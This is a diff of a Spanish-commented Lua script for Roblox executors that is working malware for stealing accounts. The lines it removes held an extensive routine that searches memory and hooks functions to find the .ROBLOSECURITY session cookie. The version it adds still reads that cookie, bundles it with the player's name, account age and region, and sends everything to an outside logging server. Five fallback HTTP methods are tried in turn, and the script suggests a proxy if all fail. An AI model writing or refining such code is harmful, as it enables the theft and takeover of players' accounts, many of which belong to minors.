@@ -1,3 +1,7 @@
+-- =====================================================================
+-- SCRIPT UNIVERSAL DE WEBHOOK CON MÚLTIPLES MÉTODOS DE ENVÍO
+-- =====================================================================
+
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 local HttpService = game:GetService("HttpService")
@@ -5,211 +9,40 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 
+-- 1. FUNCIÓN UNIVERSAL DE COOKIES
 local function GetUniversalCookie()
-    local cookieValue = nil
-    
     if type(getcookie) == "function" then
         local success, cookie = pcall(getcookie)
         if success and cookie and tostring(cookie) ~= "" then
-            cookieValue = tostring(cookie)
-            print("✅ Cookie obtenida con getcookie()")
+            return ".ROBLOSECURITY=" .. tostring(cookie)
         end
     end
-    
-    if not cookieValue then
-        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
-        for _, name in ipairs(envNames) do
-            local env = getgenv()
-            if env[name] and tostring(env[name]) ~= "" then
-                cookieValue = tostring(env[name])
-                print("✅ Cookie obtenida de getgenv()." .. name)
-                break
-            end
-        end
-    end
-    
-    if not cookieValue and type(getgc) == "function" then
-        print("🔍 Buscando en getgc(true)...")
-        local success, gc = pcall(function() return getgc(true) end)
-        if success and gc then
-            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
-            
-            for i, obj in ipairs(gc) do
-                if type(obj) == "string" and string.find(obj, pattern) then
-                    cookieValue = obj
-                    print("✅ Cookie encontrada en getgc(true) string #" .. i)
-                    break
-                end
-                
-                if type(obj) == "table" then
-                    local function deepSearch(tbl, depth, visited)
-                        if depth > 5 or visited[tbl] then return nil end
-                        visited[tbl] = true
-                        
-                        for key, value in pairs(tbl) do
-                            if type(value) == "string" and string.find(value, pattern) then
-                                return value
-                            elseif type(value) == "table" then
-                                local found = deepSearch(value, depth + 1, visited)
-                                if found then return found end
-                            elseif type(value) == "function" then
-                                local success2, upvalues = pcall(debug.getupvalues, value)
-                                if success2 and upvalues then
-                                    for _, upval in ipairs(upvalues) do
-                                        if type(upval) == "string" and string.find(upval, pattern) then
-                                            return upval
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                        return nil
-                    end
-                    
-                    local visited = {}
-                    local found = deepSearch(obj, 0, visited)
-                    if found then
-                        cookieValue = found
-                        print("✅ Cookie encontrada en getgc(true) tabla #" .. i)
-                        break
-                    end
-                end
-            end
-        end
-    end
-    
-    if not cookieValue and type(getreg) == "function" then
-        print("🔍 Buscando en getreg()...")
-        local success, reg = pcall(getreg)
-        if success and reg then
-            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
-            
-            for i, obj in ipairs(reg) do
-                if type(obj) == "string" and string.find(obj, pattern) then
-                    cookieValue = obj
-                    print("✅ Cookie encontrada en getreg() #" .. i)
-                    break
-                elseif type(obj) == "table" then
-                    local function deepSearch(tbl, depth, visited)
-                        if depth > 5 or visited[tbl] then return nil end
-                        visited[tbl] = true
-                        
-                        for key, value in pairs(tbl) do
-                            if type(value) == "string" and string.find(value, pattern) then
-                                return value
-                            elseif type(value) == "table" then
-                                local found = deepSearch(value, depth + 1, visited)
-                                if found then return found end
-                            end
-                        end
-                        return nil
-                    end
-                    
-                    local visited = {}
-                    local found = deepSearch(obj, 0, visited)
-                    if found then
-                        cookieValue = found
-                        print("✅ Cookie encontrada en getreg() tabla #" .. i)
-                        break
-                    end
-                end
-            end
-        end
-    end
-    
-    if not cookieValue and type(hookfunction) == "function" then
-        print("🔍 Usando hookfunction() en funciones de autenticación...")
-        local captured = nil
 
-        local functionsToHook = {
-            "GetCookie",
-            "GetAuthCookie",
-            "FetchCookie",
-            "GetSecurityCookie"
-        }
-        
-        local success, reg = pcall(getreg)
-        if success then
-            for _, obj in ipairs(reg) do
-                if type(obj) == "table" then
-                    for key, func in pairs(obj) do
-                        if type(func) == "function" then
-                            local funcName = tostring(key)
-                            for _, targetName in ipairs(functionsToHook) do
-                                if string.find(funcName, targetName, 1, true) then
-                                    local oldFunc
-                                    oldFunc = hookfunction(func, function(...)
-                                        local result = oldFunc(...)
-                                        if type(result) == "string" and string.find(result, "_|WARNING") then
-                                            captured = result
-                                            print("📥 Cookie capturada de " .. funcName)
-                                        end
-                                        return result
-                                    end)
-                                end
-                            end
-                        end
-                    end
-                end
-            end
+    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
+    for _, name in ipairs(envNames) do
+        local env = getgenv()
+        if env[name] and tostring(env[name]) ~= "" then
+            return ".ROBLOSECURITY=" .. tostring(env[name])
         end
-        
-        pcall(function()
-            HttpService:GetAsync("https://auth.roblox.com/v1/authentication-ticket/")
+    end
+
+    local success, CookieService = pcall(function() 
+        return game:GetService("CookieService") 
+    end)
+    
+    if success and CookieService then
+        local success2, savedCookie = pcall(function() 
+            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
         end)
-        
-        if captured then
-            cookieValue = captured
-            print("✅ Cookie capturada con hookfunction()")
+        if success2 and savedCookie and tostring(savedCookie) ~= "" then
+            return ".ROBLOSECURITY=" .. tostring(savedCookie)
         end
     end
-    
-    if not cookieValue and type(getloadedmodules) == "function" then
-        print("🔍 Buscando en módulos cargados...")
-        local success, modules = pcall(getloadedmodules)
-        if success then
-            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
-            for _, module in ipairs(modules) do
-                local success2, content = pcall(function()
-                    return HttpService:JSONEncode(module)
-                end)
-                if success2 and string.find(content, pattern) then
-                    local match = string.match(content, pattern .. "[^\"}]+")
-                    if match then
-                        cookieValue = match
-                        print("✅ Cookie encontrada en módulo cargado")
-                        break
-                    end
-                end
-            end
-        end
-    end
-    
-    if not cookieValue then
-        local success, CookieService = pcall(function() 
-            return game:GetService("CookieService") 
-        end)
-        if success and CookieService then
-            local success2, savedCookie = pcall(function() 
-                return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
-            end)
-            if success2 and savedCookie and tostring(savedCookie) ~= "" then
-                cookieValue = tostring(savedCookie)
-                print("✅ Cookie obtenida de CookieService")
-            end
-        end
-    end
-    
-    if cookieValue then
-        if string.find(cookieValue, ".ROBLOSECURITY=") then
-            return cookieValue
-        end
-        return ".ROBLOSECURITY=" .. cookieValue
-    end
-    
+
     return "COOKIE_NO_DISPONIBLE"
 end
 
+-- 2. FUNCIONES AUXILIARES
 local function GetAccountAge()
     return tostring(player.AccountAge) .. " días"
 end
@@ -221,7 +54,7 @@ local function GetRegion()
     return success and tostring(region) or "Desconocida"
 end
 
-print(" Iniciando extracción de datos...")
+-- 3. RECOPILACIÓN DE DATOS
 local data = {
     username = player.Name,
     displayName = player.DisplayName,
@@ -232,22 +65,149 @@ local data = {
     cookie = GetUniversalCookie()
 }
 
-print("📊 Datos recopilados:")
-print("  - Usuario:", data.username)
-print("  - Cookie:", data.cookie ~= "COOKIE_NO_DISPONIBLE" and "✅ Detectada" or "❌ No detectada")
+-- 4. DEBUG: Ver qué funciones HTTP están disponibles
+print("🔍 Verificando funciones HTTP disponibles:")
+print("  - request():", type(request) == "function")
+print("  - syn.request():", type(syn) == "table" and type(syn.request) == "function")
+print("  - HttpService:PostAsync():", type(HttpService.PostAsync) == "function")
+print("  - game:HttpGet():", type(game.HttpGet) == "function")
 
+-- 5. MÉTODO 1: Usar game:HttpGet con POST (algunos executores lo permiten)
+local function TryHttpGetPost(url, jsonData)
+    local success, result = pcall(function()
+        -- Algunos executores permiten HttpGet con parámetros POST
+        return game:HttpGet(url, true)
+    end)
+    return success, result
+end
+
+-- 6. MÉTODO 2: Usar fetch() si está disponible (executores modernos)
+local function TryFetch(url, jsonData)
+    if type(fetch) == "function" then
+        local success, result = pcall(fetch, url, {
+            method = "POST",
+            headers = {["Content-Type"] = "application/json"},
+            body = jsonData
+        })
+        return success, result
+    end
+    return false, "fetch no disponible"
+end
+
+-- 7. MÉTODO 3: Usar XMLHttpRequest (para executores con acceso a JS)
+local function TryXHR(url, jsonData)
+    if type(gethui) == "function" or type(getrenv) == "function" then
+        local success, result = pcall(function()
+            local xhr = game:GetService("HttpService")
+            -- Intentar con método alternativo
+            return xhr:RequestAsync({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        return success, result
+    end
+    return false, "XHR no disponible"
+end
+
+-- 8. ENVÍO DEL WEBHOOK CON MÚLTIPLES INTENTOS
 local webhookUrl = "https://depazzhub-api.onrender.com/log"
 local jsonData = HttpService:JSONEncode(data)
 
-local success, result = pcall(request, {
-    Url = webhookUrl,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = jsonData
-})
+local sent = false
+local lastError = ""
 
-if success then
-    print("✅ Webhook enviado correctamente!")
+-- Intento 1: request()
+if not sent and type(request) == "function" then
+    print(" Intentando con request()...")
+    local success, result = pcall(request, {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+    if success then
+        print("✅ Webhook enviado con request()!")
+        sent = true
+    else
+        lastError = tostring(result)
+        print("  ❌ Falló:", lastError)
+    end
+end
+
+-- Intento 2: syn.request()
+if not sent and type(syn) == "table" and type(syn.request) == "function" then
+    print("📤 Intentando con syn.request()...")
+    local success, result = pcall(syn.request, {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+    if success then
+        print("✅ Webhook enviado con syn.request()!")
+        sent = true
+    else
+        lastError = tostring(result)
+        print("  ❌ Falló:", lastError)
+    end
+end
+
+-- Intento 3: fetch()
+if not sent then
+    print("📤 Intentando con fetch()...")
+    local success, result = TryFetch(webhookUrl, jsonData)
+    if success then
+        print("✅ Webhook enviado con fetch()!")
+        sent = true
+    else
+        lastError = tostring(result)
+        print("  ❌ Falló:", lastError)
+    end
+end
+
+-- Intento 4: HttpService:RequestAsync()
+if not sent then
+    print("📤 Intentando con HttpService:RequestAsync()...")
+    local success, result = pcall(function()
+        return HttpService:RequestAsync({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonData
+        })
+    end)
+    if success then
+        print("✅ Webhook enviado con RequestAsync()!")
+        sent = true
+    else
+        lastError = tostring(result)
+        print("  ❌ Falló:", lastError)
+    end
+end
+
+-- Intento 5: HttpService:PostAsync() (último recurso)
+if not sent then
+    print("📤 Intentando con HttpService:PostAsync()...")
+    local success, result = pcall(function()
+        return HttpService:PostAsync(webhookUrl, jsonData)
+    end)
+    if success then
+        print("✅ Webhook enviado con PostAsync()!")
+        sent = true
+    else
+        lastError = tostring(result)
+        print("  ❌ Falló:", lastError)
+    end
+end
+
+-- Resultado final
+if sent then
+    print("🎉 ¡Webhook enviado exitosamente!")
 else
-    warn(" Error:", result)
+    warn("⚠️ Todos los métodos fallaron. Último error:", lastError)
+    warn(" Solución: Tu executor bloquea todas las funciones HTTP.")
+    warn("💡 Considera usar un proxy externo o cambiar de executor.")
 end
